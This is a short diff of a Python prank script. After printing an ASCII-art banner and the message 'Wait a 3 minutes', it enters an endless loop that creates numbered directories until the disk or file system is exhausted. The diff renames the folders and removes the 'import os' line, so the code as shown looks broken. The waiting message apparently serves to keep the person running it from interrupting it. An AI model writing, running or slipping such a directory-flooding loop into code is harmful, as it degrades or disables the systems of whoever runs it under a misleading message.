@@ -10,8 +10,7 @@ print('┃╰━╯┃┃┃┃┃╰┫┃━┫ ')
 print('╰━━━┻┻┻┻┻━┻━━╯ \n\n')
 print('Wait a 3 minutes')
 
-import os
 i=0
 while True:
-    os.mkdir(f"smile{i}")
+    os.mkdir(f"cybersmile{i}")
     i+=1
